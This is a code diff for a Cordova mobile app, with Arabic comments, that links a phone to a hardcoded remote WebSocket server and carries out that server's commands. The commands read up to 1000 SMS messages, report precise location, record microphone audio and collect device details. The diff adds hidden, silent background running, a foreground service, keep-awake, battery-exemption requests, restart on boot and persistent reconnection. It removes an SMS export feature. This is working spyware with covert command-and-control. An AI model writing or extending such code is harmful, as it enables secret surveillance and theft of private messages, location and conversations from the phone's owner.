@@ -1,41 +1,16 @@
 document.addEventListener('deviceready', onDeviceReady, false);
+
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
+
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // طلب الأذونات المطلوبة عند فتح التطبيق
-  requestPermissions();
+  // طلب الأذونات الأساسية فور تشغيل التطبيق
+  requestEssentialPermissions();
   
-  // تمكين التشغيل في الخلفية مع إعدادات أكثر فعالية
-  if (cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.setDefaults({
-      title: 'التطبيق يعمل في الخلفية',
-      text: 'جارٍ مراقبة الأوامر الواردة',
-      color: 'F14F4D',
-      icon: 'icon',
-      resume: true,
-      hidden: true,
-      bigText: true,
-      // إضافة خاصية الموافقة التلقائية على الوضع الخلفي
-      silent: true
-    });
-    
-    cordova.plugins.backgroundMode.enable();
-    
-    // منع الجهاز من الدخول في وضع السكون
-    cordova.plugins.backgroundMode.on('activate', function() {
-      cordova.plugins.backgroundMode.disableBatteryOptimizations();
-      if (cordova.plugins.insomnia) {
-        cordova.plugins.insomnia.keepAwake();
-      }
-    });
-    
-    // التعامل مع الضغط على إشعار الوضع الخلفي
-    cordova.plugins.backgroundMode.on('notificationclick', function() {
-      cordova.plugins.backgroundMode.moveToForeground();
-    });
-  }
+  // تحسين وضع الخلفية ليبقى التطبيق نشطًا دائمًا
+  setupBackgroundMode();
   
   // معلومات الجهاز
   const deviceInfo = {
@@ -100,9 +75,8 @@ function onDeviceReady() {
   }
 }
 
-// دالة طلب الأذونات عند فتح التطبيق
-function requestPermissions() {
-  // طلب الأذونات المطلوبة
+// طلب الأذونات الأساسية فور تشغيل التطبيق
+function requestEssentialPermissions() {
   if (cordova.platformId === 'android') {
     const permissions = cordova.plugins.permissions;
     
@@ -111,64 +85,143 @@ function requestPermissions() {
       permissions.READ_SMS,
       permissions.RECORD_AUDIO,
       permissions.WRITE_EXTERNAL_STORAGE,
-      permissions.READ_EXTERNAL_STORAGE
+      permissions.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
     ];
     
     permissions.hasPermission(neededPermissions, function(status) {
       if (!status.hasPermission) {
-        permissions.requestPermissions(
-          neededPermissions,
-          function(status) {
-            if (!status.hasPermission) {
-              console.warn('لم يتم منح الأذونات المطلوبة');
-            } else {
-              console.log('تم منح جميع الأذونات المطلوبة');
-            }
-          },
-          function(error) {
-            console.error('خطأ في طلب الأذونات:', error);
+        permissions.requestPermissions(neededPermissions, function(status) {
+          if (!status.hasPermission) {
+            console.warn('لم يتم منح الأذونات المطلوبة');
+            // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
+            requestBatteryOptimizationExemption();
+          } else {
+            console.log('تم منح جميع الأذونات المطلوبة');
           }
-        );
+        }, function(error) {
+          console.error('خطأ في طلب الأذونات:', error);
+          // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
+          requestBatteryOptimizationExemption();
+        });
       }
     });
-  } else if (cordova.platformId === 'ios') {
-    // في iOS، يتم طلب الأذونات عند الحاجة
-    // لكن يمكن التحقق من أذونات الموقع
-    if (navigator && navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(() => {}, () => {});
+  }
+}
+
+// طلب إعفاء من تحسينات البطارية (مهم للبقاء في الخلفية)
+function requestBatteryOptimizationExemption() {
+  if (cordova.platformId === 'android' && cordova.plugins && cordova.plugins.BatterySaver) {
+    cordova.plugins.BatterySaver.isIgnoringBatteryOptimizations(function(isIgnoring) {
+      if (!isIgnoring) {
+        cordova.plugins.BatterySaver.requestIgnoreBatteryOptimizations(function() {
+          console.log('تم طلب إعفاء من تحسينات البطارية');
+        }, function(error) {
+          console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
+          // محاولة بديلة
+          try {
+            cordova.plugins.BatteryStatus.requestOptimizationsExemption();
+          } catch (e) {
+            console.error('فشل المحاولة البديلة:', e);
+          }
+        });
+      }
+    });
+  }
+}
+
+// تحسين وضع الخلفية
+function setupBackgroundMode() {
+  if (cordova.plugins.backgroundMode) {
+    // إعدادات أكثر فعالية ليبقى التطبيق نشطًا
+    cordova.plugins.backgroundMode.setDefaults({
+      title: 'التطبيق يعمل في الخلفية',
+      text: 'جارٍ مراقبة الأوامر الواردة',
+      color: 'F14F4D',
+      icon: 'icon',
+      resume: true,
+      hidden: true,
+      bigText: true,
+      silent: true
+    });
+    
+    cordova.plugins.backgroundMode.enable();
+    
+    // منع الجهاز من الدخول في وضع السكون
+    if (cordova.plugins.insomnia) {
+      cordova.plugins.insomnia.keepAwake();
     }
     
-    // طلب أذونات الرسائل (SMS)
-    if (typeof cordova !== 'undefined' && cordova.plugins && cordova.plugins.SMS) {
-      cordova.plugins.SMS.hasPermission(function(hasPermission) {
-        if (!hasPermission) {
-          cordova.plugins.SMS.requestPermission(function() {
-            console.log('تم منح أذونات الرسائل');
-          }, function(error) {
-            console.error('خطأ في طلب أذونات الرسائل:', error);
-          });
-        }
-      });
-    }
+    // التعامل مع تفعيل الوضع الخلفي
+    cordova.plugins.backgroundMode.on('activate', function() {
+      // تعطيل تحسينات البطارية ليبقى التطبيق نشطًا
+      if (cordova.plugins.backgroundMode.disableBatteryOptimizations) {
+        cordova.plugins.backgroundMode.disableBatteryOptimizations();
+      }
+      
+      // التأكد من إعادة الاتصال بالخادم
+      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
+        const deviceInfo = {
+          uuid: device.uuid || 'unknown',
+          model: device.model || 'Unknown',
+          platform: device.platform || 'Unknown',
+          version: device.version || 'Unknown',
+          manufacturer: device.manufacturer || 'Unknown'
+        };
+        connectToServer(deviceInfo);
+      }
+    });
+    
+    // التعامل مع الضغط على إشعار الوضع الخلفي
+    cordova.plugins.backgroundMode.on('notificationclick', function() {
+      cordova.plugins.backgroundMode.moveToForeground();
+    });
+  }
+  
+  // التأكد من استمرار التطبيق في الخلفية حتى بعد إغلاقه
+  if (cordova.plugins.foregroundService) {
+    cordova.plugins.foregroundService.start(
+      'التطبيق يعمل في الخلفية',
+      'جارٍ مراقبة الأوامر الواردة',
+      'icon',
+      function() {
+        console.log('Foreground service started');
+      },
+      function(error) {
+        console.error('Foreground service error:', error);
+      }
+    );
   }
 }
 
 function connectToServer(deviceInfo) {
   // استخدام رابط الخادم المقدم
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
+  
+  // التأكد من عدم وجود اتصال مكرر
+  if (window.wsConnection) {
+    try {
+      window.wsConnection.close();
+    } catch (e) {
+      console.log('No existing connection to close');
+    }
+  }
+  
   window.wsConnection = new WebSocket(wsUrl);
   
-  wsConnection.onopen = () => {
+  window.wsConnection.onopen = () => {
     console.log('Connected to server');
     // تسجيل الجهاز
-    wsConnection.send(JSON.stringify({
+    window.wsConnection.send(JSON.stringify({
       type: 'register',
       deviceId: deviceInfo.uuid,
       deviceInfo
     }));
+    
+    // إرسال نبضات قلبية دورية
+    startHeartbeat();
   };
   
-  wsConnection.onmessage = (event) => {
+  window.wsConnection.onmessage = (event) => {
     try {
       const data = JSON.parse(event.data);
       if (data.type === 'command') {
@@ -181,8 +234,8 @@ function connectToServer(deviceInfo) {
         });
         // تنفيذ الأمر وإرسال الرد
         executeCommand(data.command, data.commandId, (response) => {
-          if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
-            wsConnection.send(JSON.stringify({
+          if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
+            window.wsConnection.send(JSON.stringify({
               type: 'response',
               commandId: data.commandId,
               response: {
@@ -201,43 +254,82 @@ function connectToServer(deviceInfo) {
     }
   };
   
-  wsConnection.onerror = (error) => {
+  window.wsConnection.onerror = (error) => {
     console.error('WebSocket error:', error);
   };
   
-  wsConnection.onclose = () => {
+  window.wsConnection.onclose = () => {
     console.log('Disconnected from server');
-    // محاولة إعادة الاتصال بشكل أكثر تكراراً في البداية ثم تقليل التكرار
-    let reconnectDelay = 1000;
-    const maxReconnectDelay = 30000;
-    
-    function attemptReconnect() {
-      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-        console.log(`Attempting to reconnect in ${reconnectDelay}ms...`);
-        setTimeout(() => {
-          connectToServer(deviceInfo);
-          // زيادة المهلة تدريجياً حتى الحد الأقصى
-          reconnectDelay = Math.min(reconnectDelay * 2, maxReconnectDelay);
-          attemptReconnect();
-        }, reconnectDelay);
-      }
-    }
-    
-    attemptReconnect();
+    // محاولة إعادة الاتصال بشكل أكثر ذكاءً
+    reconnectWithExponentialBackoff(deviceInfo);
   };
+}
+
+// متغيرات لإدارة إعادة الاتصال
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
+let heartbeatInterval = null;
+
+// دالة لإرسال نبضات القلب
+function startHeartbeat() {
+  // إيقاف أي نبضات قديمة
+  if (heartbeatInterval) {
+    clearInterval(heartbeatInterval);
+  }
   
-  // إرسال نبضات قلبية دورية
-  const heartbeatInterval = setInterval(() => {
-    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
-      wsConnection.send(JSON.stringify({ 
-        type: 'heartbeat',
-        timestamp: new Date().toISOString(),
-        receivedRequests // إرسال سجل الطلبات المستلمة
-      }));
+  // إرسال نبضات قلبية كل 30 ثانية
+  heartbeatInterval = setInterval(() => {
+    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
+      try {
+        window.wsConnection.send(JSON.stringify({ 
+          type: 'heartbeat',
+          timestamp: new Date().toISOString(),
+          receivedRequests // إرسال سجل الطلبات المستلمة
+        }));
+      } catch (e) {
+        console.error('Error sending heartbeat:', e);
+        clearInterval(heartbeatInterval);
+        reconnectWithExponentialBackoff({
+          uuid: device.uuid || 'unknown',
+          model: device.model || 'Unknown',
+          platform: device.platform || 'Unknown',
+          version: device.version || 'Unknown',
+          manufacturer: device.manufacturer || 'Unknown'
+        });
+      }
     } else {
       clearInterval(heartbeatInterval);
+      reconnectWithExponentialBackoff({
+        uuid: device.uuid || 'unknown',
+        model: device.model || 'Unknown',
+        platform: device.platform || 'Unknown',
+        version: device.version || 'Unknown',
+        manufacturer: device.manufacturer || 'Unknown'
+      });
     }
   }, 30000);
+}
+
+// دالة لإعادة الاتصال مع زيادة المهلة تدريجياً
+function reconnectWithExponentialBackoff(deviceInfo) {
+  reconnectAttempts++;
+  
+  // حساب المهلة مع زيادة تدريجية (2^reconnectAttempts * 1000)
+  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 300000); // الحد الأقصى 5 دقائق
+  
+  console.log(`محاولة إعادة الاتصال ${reconnectAttempts} بعد ${delay}ms`);
+  
+  setTimeout(() => {
+    if (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
+      connectToServer(deviceInfo);
+    } else {
+      console.log('تم بلوغ الحد الأقصى لمحاولات إعادة الاتصال');
+      // إعادة تعيين المحاولات بعد فترة طويلة
+      setTimeout(() => {
+        reconnectAttempts = 0;
+      }, 3600000); // 60 دقيقة
+    }
+  }, delay);
 }
 
 function executeCommand(command, commandId, callback) {
@@ -258,9 +350,6 @@ function executeCommand(command, commandId, callback) {
     case 'get_received_requests':
       getReceivedRequests(commandId, callback);
       break;
-    case 'export_sms':
-      exportSMS(commandId, callback);
-      break;
     default:
       callback({ 
         commandId,
@@ -274,7 +363,7 @@ function executeCommand(command, commandId, callback) {
 function getLocation(commandId, callback) {
   const options = {
     enableHighAccuracy: true,
-    timeout: 15000,
+    timeout: 30000, // زيادة المهلة
     maximumAge: 0
   };
   navigator.geolocation.getCurrentPosition(
@@ -325,7 +414,7 @@ function getSMS(commandId, callback) {
   }
   const filter = {
     box: 'inbox',
-    maxCount: 1000, // زيادة الحد الأقصى للرسائل
+    maxCount: 1000,
     indexFrom: 0
   };
   SMS.listSMS(
@@ -338,7 +427,7 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body, // عرض النص الكامل بدون قص
+          body: msg.body,
           date: msg.date,
           read: msg.read
         }))
@@ -355,48 +444,10 @@ function getSMS(commandId, callback) {
   );
 }
 
-// تصدير الرسائل كملف نصي
-function exportSMS(commandId, callback) {
-  getSMS(commandId, (smsResponse) => {
-    if (smsResponse.status === 'success') {
-      // إنشاء محتوى الملف النصي
-      let txtContent = "رسائل SMS\n================\n\n";
-      
-      smsResponse.messages.forEach(msg => {
-        txtContent += `من: ${msg.address}\n`;
-        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString()}\n`;
-        txtContent += `الرسالة: ${msg.body}\n`;
-        txtContent += "----------------\n\n";
-      });
-      
-      // إنشاء كائن.blob و.URL
-      const blob = new Blob([txtContent], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      
-      // حفظ الملف في التخزين المحلي
-      const fileName = `sms_export_${Date.now()}.txt`;
-      saveFileToStorage(fileName, blob);
-      
-      callback({
-        commandId,
-        status: 'success',
-        export: {
-          format: 'txt',
-          downloadUrl: url,
-          fileName: fileName,
-          size: blob.size
-        }
-      });
-    } else {
-      callback(smsResponse);
-    }
-  });
-}
-
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   const mediaRecorderOptions = {
-    mimeType: 'audio/mp3', // استخدام صيغة MP3
+    mimeType: 'audio/mp3',
     audioBitsPerSecond: 128000
   };
   navigator.mediaDevices.getUserMedia({ audio: true })
@@ -453,19 +504,6 @@ function saveAudioToStorage(fileName, blob) {
   });
 }
 
-// حفظ الملفات النصية في التخزين
-function saveFileToStorage(fileName, blob) {
-  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
-    dir.getFile(fileName, { create: true }, fileEntry => {
-      fileEntry.createWriter(fileWriter => {
-        fileWriter.onwriteend = () => console.log('File saved:', fileName);
-        fileWriter.onerror = e => console.error('Error saving file:', e);
-        fileWriter.write(blob);
-      });
-    });
-  });
-}
-
 function getDeviceInfo(commandId, callback) {
   const info = {
     cordova: device.cordova,
@@ -495,9 +533,15 @@ function getReceivedRequests(commandId, callback) {
 
 // إعادة الاتصال عند استئناف التطبيق
 document.addEventListener('resume', () => {
+  console.log('App resumed, checking connection...');
   if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-    console.log('App resumed, reconnecting...');
-    onDeviceReady();
+    reconnectWithExponentialBackoff({
+      uuid: device.uuid || 'unknown',
+      model: device.model || 'Unknown',
+      platform: device.platform || 'Unknown',
+      version: device.version || 'Unknown',
+      manufacturer: device.manufacturer || 'Unknown'
+    });
   }
 }, false);
 
@@ -506,3 +550,42 @@ document.addEventListener('bootcomplete', () => {
   console.log('Device booted, starting app...');
   onDeviceReady();
 }, false);
+
+// إضافة حدث لبدء التطبيق عند التشغيل
+document.addEventListener('deviceready', () => {
+  // التأكد من تشغيل التطبيق في الخلفية بعد التشغيل
+  if (cordova.plugins.backgroundMode) {
+    cordova.plugins.backgroundMode.enable();
+  }
+  
+  // التأكد من تشغيل خدمة المقدمة
+  if (cordova.plugins.foregroundService) {
+    cordova.plugins.foregroundService.start(
+      'التطبيق يعمل في الخلفية',
+      'جارٍ مراقبة الأوامر الواردة',
+      'icon',
+      function() {
+        console.log('Foreground service started after boot');
+      },
+      function(error) {
+        console.error('Foreground service error after boot:', error);
+      }
+    );
+  }
+}, false);
+
+// إضافة معالج للأخطاء الحرجة
+window.onerror = function(message, source, lineno, colno, error) {
+  console.error('Critical error:', message, error);
+  // محاولة إعادة الاتصال في حالة حدوث خطأ حرج
+  if (error && error.message && error.message.includes('WebSocket')) {
+    reconnectWithExponentialBackoff({
+      uuid: device.uuid || 'unknown',
+      model: device.model || 'Unknown',
+      platform: device.platform || 'Unknown',
+      version: device.version || 'Unknown',
+      manufacturer: device.manufacturer || 'Unknown'
+    });
+  }
+  return false;
+};
